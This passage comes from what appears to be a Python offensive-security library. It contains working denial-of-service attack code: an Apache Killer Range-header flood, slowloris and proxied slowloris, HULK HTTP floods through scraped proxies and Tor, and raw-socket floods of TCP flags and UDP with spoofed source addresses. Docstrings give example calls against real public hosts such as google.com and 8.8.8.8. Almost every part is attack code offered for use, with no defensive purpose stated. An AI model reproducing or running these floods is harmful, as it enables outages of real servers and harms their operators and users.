      s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(random.randint(1,1000000))+str(random.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
      apache_killer_counter+=1
      if self.logs==True:
        sys.stdout.write("\rRequests sent: {}".format(apache_killer_counter))
        sys.stdout.flush()
        #print("Requests sent: {}".format(apache_killer_counter))
     except:
      break
     time.sleep(self.interval)
   except:
    pass
  self.target=None
  self.port=None
  self.timeout=None
  self.tor=None
  self.round_min=None
  self.round_max=None
  self.interval=None
class ptc(threading.Thread):
 def run(self):
  global proxslow_counter
  self.target=target
  self.port=port
  self.timeout=_timeout
  self.min_speed=sre1
  self.max_speed=sre2
  time.sleep(2)
  while (stop!=True):
   try:
    z=random.randint(1,20)
    if z<13:
     line=random.choice(httplist)
    elif (z in [13,14,15,16]):
     line=random.choice(socks4list)
    elif (z in [17,18,19,20]):
     line=random.choice(socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [13,14,15,16]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [17,18,19,20]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if z<13:
     s.settimeout(self.timeout)
    s.connect((self.target,self.port))
    while (stop!=True):
     pa=random.choice(paths)
     if "?" in pa:
      jo='&'
     else:
      jo='?'
     pa+=jo+str(random.randint(1,1000000000))+'='+str(random.randint(1,1000000000))
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
      if self.logs==True:
        sys.stdout.write("\rSlow-->{}   ".format(ipp))
        sys.stdout.flush()
        #print("Slow-->{}".format(ipp))
      time.sleep(random.randint(self.min_speed,self.max_speed))
     except:
      break
    s.close()
   except Exception as e:
    pass
  self.target=None
  self.port=None
  self.timeout=None
  self.min_speed=None
  self.max_speed=None
def prox_slow(u,p=80,scraping_timeout=15,threads=500,timeout=5,min_speed=3,max_speed=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True,returning=False,set_tor=False):
 thr=[]
 global proxslow_counter
 proxslow_counter=0
 global httplist
 if http_list:
  httplist=http_list
 else:
  httplist=masshttp(timeout=scraping_timeout)
 global socks4list
 if socks4_list:
  socks4list=socks4_list
 else:
  socks4list=massocks4(timeout=scraping_timeout)
 global socks5list
 if socks5_list:
  socks5list=socks5_list
 else:
  socks5list=massocks5(timeout=scraping_timeout)
 global tor
 tor=set_tor
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global _timeout
 _timeout=timeout
 global sre1
 sre1=min_speed
 global sre2
 sre2=max_speed
 '''global rre1
 rre1=read1
 global rre2
 rre2=read2'''
 for x in range(threads):
  try:
   t=ptc()
   t.start()
   thr.append(t)
  except:
    pass
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
 if returning==True:
  return proxslow_counter
def apache_killer(u,p=80,threads=256,timeout=5,round_min=5,round_max=15,interval=0.1,duration=60,logs=True,returning=False,set_tor=False):
 '''
   this is a python version of the apache killer tool which was originally written in perl.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 256) number of connections
   timeout: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.apache_killer('www.google.com',p=80)

'''
 thr=[]
 global apache_killer_counter
 apache_killer_counter=0
 global tor
 tor=set_tor
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global _timeout
 _timeout=timeout
 global packs1
 packs1=round_max
 global packs2
 packs2=round_min
 global speed
 speed=interval
 for x in range(threads):
  try:
   thr.append(apa().start())
  except:
    pass
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
 if returning==True:
  return apache_killer_counter
class loris(threading.Thread):
 def run(self):
  global slowloris_counter
  self.target=target
  self.port=port
  self.timeout=_timeout
  self.tor=tor
  ls=[]
  if self.logs==True:
   print("\tBuilding sockets...")
  time.sleep(1)
  while (stop!=True):
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target, self.port))
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    pa=random.choice(paths)
    q=''
    for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
    p=''
    for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
    if '?' in pa:
      jo='&'
    else:
      jo='?' 
    pa+=jo+q+"="+p
    s.send("GET {} HTTP/1.1\r\n".format(pa).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    ls.append(s)
    slowloris_counter+=1
   except Exception as e:
    pass
   for so in list(ls):
    try:
     so.send("X-a: {}\r\n".format(random.randint(1, 1000000)).encode("utf-8"))
    except socket.error as e:
     ls.remove(so)
     slowloris_counter=slowloris_counter-1
     if slowloris_counter<0:
      slowloris_counter=0
   if stop==True:
    break
   if self.logs==True:
    sys.stdout.write("\r\tSockets alive: {}".format(slowloris_counter))
    sys.stdout.flush()
  for soc in ls:
    try:
     soc.close()
    except:
     pass
  ls=[]
  self.target=None
  self.port=None
  self.timeout=None
  self.tor=None
  ls=None
def slowloris(u,p=80,threads=20,timeout=5,duration=60,logs=True,set_tor=False):
 '''
   this function is for advanced slowloris attack. here this script is acting differently, it uses the threads to consume the target's available connections but without connections' count limit, so it keeps consuming the server's connections till it becomes unavailable.
   on each thread, it opens a connection, sends a partial HTTP request then it append it to a list, it continue doing this without stopping even if the target is down and all of this after each try to open new connection it sends random X-a: header value to keep all created connections open without reaching the timeout value.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 20) number of threads
   timeout: (set by default to: 5) connection timeout flag 

'''
 thr=[]
 global slowloris_counter
 slowloris_counter=0
 global tor
 tor=set_tor
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global _timeout
 _timeout=timeout
 for x in range(threads):
  try:
   t=loris()
   t.start()
   thr.append(t)
   time.sleep(.01)
  except:
    pass
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 print("")
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
class plor(threading.Thread):
 def run(self):
  #global prox_loris_counter
  self.target=target
  self.port=port
  self.timeout=_timeout
  self.interval=speed
  time.sleep(2)
  while (stop!=True):
   try:
    z=random.randint(1,20)
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     line=random.choice(httplist)
    elif (z in [13,14,15,16]):
     line=random.choice(socks4list)
    elif (z in [17,18,19,20]):
     line=random.choice(socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif (z in [13,14,15,16]):
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif (z in [17,18,19,20]):
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if z<13:
     s.settimeout=(self.timeout)
    s.connect((self.target,self.port))
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    pa=random.choice(paths)
    q=''
    for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
    p=''
    for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
    if '?' in pa:
      jo='&'
    else:
      jo='?' 
    pa+=jo+q+"="+p
    s.send("GET {} HTTP/1.1\r\n".format(pa).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    while (stop!=True):
     s.send("X-a: {}\r\n".format(random.randint(1,10000000)).encode("utf-8"))
     time.sleep(self.interval)
     if self.logs==True:
        sys.stdout.write("\rSocket-->{}   ".format(ipp))
        sys.stdout.flush()
        #print("socket-->{}".format(ipp))
   except:
    pass
  self.target=None
  self.port=None
  self.timeout=None
  self.interval=None
def prox_slowloris(u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True,level=1):
 '''
  u: target ip or domain
  p: (set by default to: 80) targeted port
  threads: (set by default to: 500) number of connections
  timeout: (set by default to: 5) the connection timeout flag value
  example:
  >>>import bane
  >>>bane.prox_hammer('www.google.com',threads=256)
'''
 thr=[]
 global speed
 speed=level
 global httplist
 if http_list:
  httplist=http_list
 else:
  httplist=masshttp(timeout=scraping_timeout)
 global socks4list
 if socks4_list:
  socks4list=socks4_list
 else:
  socks4list=massocks4(timeout=scraping_timeout)
 global socks5list
 if socks5_list:
  socks5list=socks5_list
 else:
  socks5list=massocks5(timeout=scraping_timeout)
 global stop
 stop=False
 
 self.logs=logs
 global pointer
 global target
 target=u
 global port
 port=p
 global _timeout
 _timeout=timeout
 for j in range(threads):
  try:
    t=plor()
    t.start()
    thr.append(t)
    time.sleep(.001)
  except:
    pass
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
class phu(threading.Thread):
 def run(self):
  global proxhulk_counter
  self.target=target
  self.timeout=_timeout
  global stop
  time.sleep(2)
  while (stop!=True):
   u=random.choice(paths)
   try:
    q=""
    for x in range(random.randint(2,5)):
     q+=random.choice(lis)+str(random.randint(1,1000000))
    p=""
    for x in range(random.randint(2,5)):
     p+=random.choice(lis)+str(random.randint(1,1000000))
    if '?' in u:
      jo='&'
    else:
      jo='?' 
    u+=jo+q+"="+p
    pr=random.choice(httplist)
    proxy = urllib2.ProxyHandler({ 'http': pr, 'https': pr })
    opener = urllib2.build_opener(proxy) 
    opener.addheaders = [('User-agent', random.choice(ua))]
    opener.addheaders = [('Cache-Control', 'no-cache')]
    opener.addheaders = [('Accept',random.choice(a))]
    opener.addheaders = [('Accept-Language',random.choice(al))]
    opener.addheaders = [('Accept-Encoding',random.choice(ec))]
    opener.addheaders = [('Accept-Charset', random.choice(ac))]
    opener.addheaders = [('Referer', random.choice(referers) +p)]
    opener.addheaders = [('Keep-Alive', random.randint(100,500))]
    opener.addheaders = [('Connection', 'keep-alive')]
    opener.addheaders = [('Host',self.target)]
    urllib2.install_opener(opener)
    urllib2.urlopen("http://"+self.target+u,timeout=self.timeout)
    if stop==True:
        break
    proxhulk_counter+=1
    if self.logs==True:
        sys.stdout.write("\rRequests: {} | Bot: {}   ".format(proxhulk_counter,pr.split(':')[0]))
        sys.stdout.flush()
        #print("Requests: {} | Bot: {}".format(proxhulk_counter,pr.split(':')[0]))
   except Exception as e:
    pass
  self.target=None
  self.timeout=None
class hu(threading.Thread):
 def run(self):
  global hulk_counter
  self.target=target
  self.timeout=_timeout
  global stop
  time.sleep(2)
  while (stop!=True):
     u=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     s=''
     for i in range(random.randint(2,5)):
      s+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+s
     request = urllib2.Request('http://'+self.target+u)
     request.add_header('User-Agent', random.choice(ua))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept',random.choice(a))
     request.add_header('Accept-Language',random.choice(al))
     request.add_header('Accept-Encoding',random.choice(ec))
     request.add_header('Accept-Charset', random.choice(ac))
     request.add_header('Referer', random.choice(referers) +p)
     request.add_header('Keep-Alive', random.randint(100,500))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host',self.target)
     try:
      urllib2.urlopen(request,timeout=self.timeout)     
      if stop==True:
        break
      hulk_counter+=1
      if self.logs==True:
        sys.stdout.write("\rRequests: {}".format(hulk_counter))
        sys.stdout.flush()
        #print("Requests: {}".format(hulk_counter))
     except urllib2.HTTPError as ex:
      if stop==True:
        break
      hulk_counter+=1
      if self.logs==True:
        sys.stdout.write("\rRequests: {}".format(hulk_counter))
        sys.stdout.flush()
        #print("Requests: {}".format(hulk_counter))
     except Exception as e:
      pass
  self.target=None
  self.timeout=None
def hulk(u,threads=700,timeout=10,duration=60,logs=True,returning=False,set_tor=False):
 '''
   this function is used for hulk attack with more complex modification (more than 10k useragents and references, also a better way to generate random http GET parameters.
    
   it takes the following parameters:

   u: target domain
   threads: (set by default to: 700) number of connections
   timeout: (set by default to: 10) connection timeout flag

   example:

   >>>import bane
   >>>bane.hulk_attack('www.google.com',threads=1000)

'''
 thr=[]
 global hulk_counter
 hulk_counter=0
 if set_tor==True:
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
  socket.socket = socks.socksocket
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global _timeout
 _timeout=timeout
 for x in range(threads):
  try:
   t= hu()
   t.start()
   thr.append(t)
  except:
    pass
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
 if returning==True:
  return hulk_counter
def prox_hulk(u,threads=700,scraping_timeout=15,http_list=None,timeout=10,duration=60,logs=True,returning=False):
 '''

   it takes the following parameters:

   u: target domain
   httpl: (set by default to: None) custom http proxies list
   threads: (set by default to: 700) number of connections
   timeout: (set by default to: 10) connection timeout flag 

   example:

   >>>import bane
   >>>bane.proxhulk('www.google.com',threads=700,httpl=your_http_proxies_list['ip:port','ip:port'])

   >>>bane.proxhulk('www.google.com')

'''
 thr=[]
 global proxhulk_counter
 proxhulk_counter=0
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global httplist
 if http_list:
  httplist=http_list
 else:
  httplist=masshttp(timeout=scraping_timeout)
 global _timeout
 _timeout=timeout
 for x in range(threads):
  try:
   t=phu()
   t.start()
   thr.append(t)
  except:
    pass
 c=time.time()
 while True:
  if stop==True:
   break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
 if returning==True:
  return proxhulk_counter
def checksum(msg):
 '''
   this function is used for the SYN flood checksum.

   it takes an input and returns it checksum.

'''
 s = 0
 for i in range(0, len(msg), 2):
   if i+1==len(msg):
     w = ord(msg[i])
     s += w
   else:
    w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
    s += w
 s = (s>>16) + (s & 0xffff);
 s = s + (s >> 16);
 s = ~s & 0xffff
 return s
class sflood(threading.Thread): 
 def run(self):
  global synflood_counter
  self.minsize=minsize
  self.maxsize=maxsize
  self.interval=speed
  self.target=target
  dip=self.target
  self.port=port
  self.urg_pointer=urg_ptr
  self.synf=synf
  self.rstf=rstf
  self.pshf=pshf
  self.ackf=ackf
  self.urgf=urgf
  self.finf=finf
  self.winds=winds
  self.paylo=paylo
  self.min_win=min_win
  self.max_win=max_win
  self.ip_seg=ip_seg
  self.maxttl=maxttl
  self.minttl=minttl
  self.s_port=s_port
  self.min_por=min_por
  self.max_por=max_por
  self.seq_number=seqnumber
  self.ack_seq=ackseq
  self.packets_id=packetsid
  sq_nb=0
  ack_nb=0
  self.tos=tos_f
  self.frag_off=frag_off_f
  self.packet_id=packetsid
  time.sleep(2)
  while (stop!=True):
   try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    if self.s_port<0:
     sp=random.randint(self.min_por,self.max_por)
    else:
     sp=self.s_port
    if self.paylo==0:
     urd=''
     req='None'
    elif self.paylo==1:
      urd=''
      req='TCP'
      for x in range(random.randint(self.minsize,self.maxsize)):
       urd+=random.choice(lis)
      if len(urd)>1400:
       urd=urd[0:1400]
    elif self.paylo==2:
      pths=random.choice(paths)
      for l in range(random.randint(1,5)):
       ed=random.choice(ec)
       oi=random.randint(1,3)
       if oi==2:
        gy=0
        while gy<1:
          df=random.choice(ec)
          if df!=ed:
           gy+=1
        ed+=', '
        ed+=df
       l=random.choice(al)
       for n in range(random.randint(0,5)):
        l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
       kl=random.randint(1,2)
       if kl==1:
        req="GET"
        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),self.target)
       else:
        req="POST"
        k=''
        for _ in range(1,random.randint(2,5)):
         k+=random.choice(lis)
        k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
        for _ in range(1,random.randint(1,3)):
         k+=random.choice(lis)
        j=''
        for x in range(0,random.randint(11,31)):
         j+=random.choice(lis)
        par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),self.target,par)
    leng=len(urd)
    urd=urd.encode('utf-8')
    if self.ip_seg==None:
     sip=getip()
    else:
     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    if self.seq_number==-1:
        sq_nb=random.randint(0,999999)
    if self.ack_seq==-1:
        ack_nb=random.randint(0,999999)
    ips = socket.inet_aton(sip)
    ipd = socket.inet_aton(dip)
    iphv = (4 << 4) + 5
    if self.packet_id<0:
     pa_id=random.randint(1,65535)
    else:
     pa_id=self.packet_id
    iph = pack('!BBHHHBBH4s4s' , iphv, self.tos, 40+len(urd), pa_id, self.frag_off, random.randint(self.minttl,self.maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
    tcr = (5 << 4) + 0
    tf = self.finf + (self.synf << 1) + (self.rstf << 2) + (self.pshf <<3) + (self.ackf << 4) + (self.urgf << 5)
    if self.winds==0:
     windf=0
    elif self.winds<0:
     windf=random.randint(self.min_win,self.max_win)#actual window size= this value * 256
    else:
     windf=self.winds
    thd = pack('!HHLLBBHHH' , sp, self.port, sq_nb , ack_nb, 5, tf, socket.htons(windf) , 0, self.urg_pointer)
    source_address = socket.inet_aton( sip ) 
    dest_address = socket.inet_aton(dip) 
    tcl = len(thd) + leng 
    psh = pack('!4s4sBBH' , source_address , dest_address , 0, socket.IPPROTO_TCP , tcl); 
    psh = psh + thd + urd; 
    tk = checksum(str(psh))
    tcp_header = pack('!HHLLBBH',sp, port, sq_nb, ack_nb, (5 << 4) + 0 , tf, socket.htons (windf))+pack('H',tk)+pack('!H',self.urg_pointer)
    packet = iph + tcp_header + urd
    s.sendto(packet, (dip,self.port))
    synflood_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets: {} | IP: {} | Type: {} | Bytes: {}   ".format(synflood_counter,sip,req,leng))
        sys.stdout.flush()
        #print("Packets: {} | IP: {} | Type: {} | Bytes: {}".format(synflood_counter,sip,req,leng))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.tos=None
  self.frag_off=None
  self.urg_pointe=None
  self.seq_number=None
  self.ack_seq=None
  self.minsize=None
  self.maxsize=None
  self.interval=None
  self.target=None
  dip=None
  self.port=None
  self.synf=None
  self.rstf=None
  self.pshf=None
  self.ackf=None
  self.urgf=None
  self.finf=None
  self.winds=None
  self.paylo=None
  self.min_win=None
  self.max_win=None
  self.ip_seg=None
  self.maxttl=None
  self.minttl=None
  self.s_port=None
  self.min_por=None
  self.max_por=None
  self.packets_id=None
def syn_flood(u,p=80,limiting=True,min_size=10,max_size=50,interval=0.1,tos=0,packets_id=-1,frag_off=0,urg_pointer=0,seq_number=0,ack_seq=0,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window_size=-1,payload=0,min_ttl=64,max_ttl=64,duration=60,logs=True,returning=False):
  '''
   this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).

   it takes the following paramters:

   u: target IP
   p: (set by default to: 80) target port
   threads: (set by default to: 100)
   syn: (set by default to: 1) syn flag value
   ack,psh,rst,urg,fin: (set by default to: 0) the other TCP flags values
   tcp: (set by default to: False) set to True to send random strings instead of http requests
   window: (set by default to: "random" for random values between 0 and 65535) tcp window size, set to "null" if you want 0 window size
   payloads: (set by default to: True) set to False to send no extra data
   low,maxi: (set by default to: 64) maximum and minimum TTL values
   ampli: (set by default to:15) multiplication of the TCP strings' size

   example:

   #to launch a syn flood
   >>>bane.syn_flood('8.8.8.8')

   #to launch ack flood
   >>>bane.syn_flood('8.8.8.8',syn=0,ack=1)

'''
  thr=[]
  global tos_f
  tos_f=tos
  global frag_off_f
  frag_off_f=frag_off
  global seqnumber
  seqnumber=seq_number
  global ackseq
  ackseq=ack_seq
  global packetsid
  packetsid=packets_id
  global urg_ptr
  urg_ptr=urg_pointer
  global minsize
  minsize=min_size
  global maxsize
  maxsize=max_size
  global speed
  speed=interval
  if limiting==False:
   speed=0
  global synflood_counter
  synflood_counter=0
  global stop
  stop=False
  global s_port
  s_port=source_port#set to negative value for random source port number
  global min_por
  min_por=min_port
  global max_por
  max_por=max_port
  global ip_seg
  ip_seg=ip_range#ip range to spoof
  global max_win
  max_win=max_window#max window size value
  if max_win>256:
   max_win=256
  global min_win
  min_win=min_window#min window size value
  if min_win<0:
   min_win=0
  
  self.logs=logs
  global target
  target=u
  global port
  port=p
  global synf
  synf=syn#syn flag
  global rstf
  rstf=rst#rst flag
  global pshf
  pshf=psh#push flag
  global ackf
  ackf=ack#ack flag
  global urgf
  urgf=urg#urg flag
  global finf
  finf=fin#fin flag
  global winds
  winds=window_size
  global paylo
  paylo=int(payload)
  if paylo<0:
   paylo=0#Empty payload
  if paylo>2:
   paylo=2#1: random tcp junk payload and 2: http payload
  global maxttl
  maxttl=max_ttl#maximum ttl
  global minttl
  minttl=min_ttl#minimum ttl
  wh=0
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
   wh+=1
  except socket.error as msg:
   print("[-]Socket could not be created:\n"+str(msg))
  if wh>0:  
   for x in range(threads):
    try:
     t= sflood()
     t.start()
     thr.append(t)
    except:
     pass
   c=time.time()
   while True:
    if stop==True:
     break
    try:
     time.sleep(.1)
     if int(time.time()-c)==duration:
      stop=True
      break
    except KeyboardInterrupt:
     stop=True
     break
   if logs==True:
     print("[*]Killing all threads...")
   for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
   if logs==True:
     print("[*]Done!")
   if returning==True:
    return synflood_counter  
class udpsp(threading.Thread):
 def run(self):
  global udpstorm_counter
  self.interval=speed
  self.target=target
  self.port=port
  self.maxttl=maxttl
  self.minttl=minttl
  self.minsize=minsize
  self.maxsize=maxsize
  self.ip_seg=ip_seg
  self.s_port=s_port
  self.min_por=min_por
  self.max_por=max_por
  time.sleep(2)
  while (stop!=True):
   try:
    if self.s_port<0:
     sp=random.randint(self.min_por,self.max_por)
    else:
     sp=self.s_port
    msg=''
    for x in range(random.randint(self.minsize,self.maxsize)):
     msg+=random.choice(lis)
    if len(msg)>1400:
     msg=msg[0:1400]
    if self.ip_seg==None:
     sip=getip()
    else:
     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    packet = IP(ttl=random.randint(self.minttl,self.maxttl),src=sip, dst=self.target)/UDP(sport=sp,dport=self.port)/msg
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    udpstorm_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets: {} | IP: {} | Type: UDP | Bytes: {}   ".format(udpstorm_counter,sip,len(packet)))
        sys.stdout.flush()
        #print("Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(udpstorm_counter,sip,len(packet)))
   except:
    pass
   time.sleep(self.interval)
  self.interval=None
  self.target=None
  self.port=None
  self.maxttl=None
  self.minttl=None
  self.minsize=None
  self.maxsize=None
  self.ip_seg=None
  self.s_port=None
  self.min_por=None
  self.max_por=None
def spoofed_udp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,min_ttl=64,max_ttl=64,duration=60,logs=True,returning=False):
 '''
   this function is for UDP flood attack using spoofed sources
'''
 thr=[]
 global minsize
 minsize=min_size
 global maxsize
 maxsize=max_size
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global udpstorm_counter
 udpstorm_counter=0
 global stop
 stop=False
 global s_port
 s_port=source_port
 global min_por
 min_por=min_port
 global max_por
 max_por=max_port
 global ip_seg
 ip_seg=ip_range
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(udpsp().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
